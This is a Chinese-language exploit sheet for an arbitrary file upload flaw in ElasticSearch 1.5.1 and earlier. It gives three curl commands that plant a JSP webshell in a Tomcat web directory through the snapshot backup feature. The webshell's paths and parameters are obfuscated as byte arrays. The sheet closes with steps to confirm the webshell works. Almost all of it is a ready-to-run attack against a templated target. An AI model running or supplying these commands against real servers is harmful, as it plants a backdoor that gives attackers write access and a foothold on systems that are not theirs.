# ElasticSearch Backup Arbitrary File Upload (WooYun-2015-110216)

## 指纹特征
- 服务: ElasticSearch <= 1.5.1
- 端口: 9200
- 场景: 目标系统同时运行有 Web 服务（如 Tomcat）且路径可预测

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 利用快照备份功能写入文件 | `/_snapshot/{{REPO}}` | 无 |

## PoC 指令

本例演示将 JSP Webshell 写入 Tomcat 的 Web 目录。

**1. 准备恶意内容 (通过创建索引)**
```bash
curl -XPOST http://{{TARGET}}:9200/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
'
```

**2. 创建恶意仓库并指向 Web 目录**
```bash
curl -XPUT 'http://{{TARGET}}:9200/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}'
```

**3. 执行备份触发文件写入**
```bash
curl -XPUT "http://{{TARGET}}:9200/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

## Success Signal
- **文件验证**: 访问写入的 Webshell 路径：`http://{{TARGET}}:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp`。
- **功能验证**: 通过 Webshell 写入文件：`...?f=success`，然后访问 `/wwwroot/test.jsp` 确认内容。
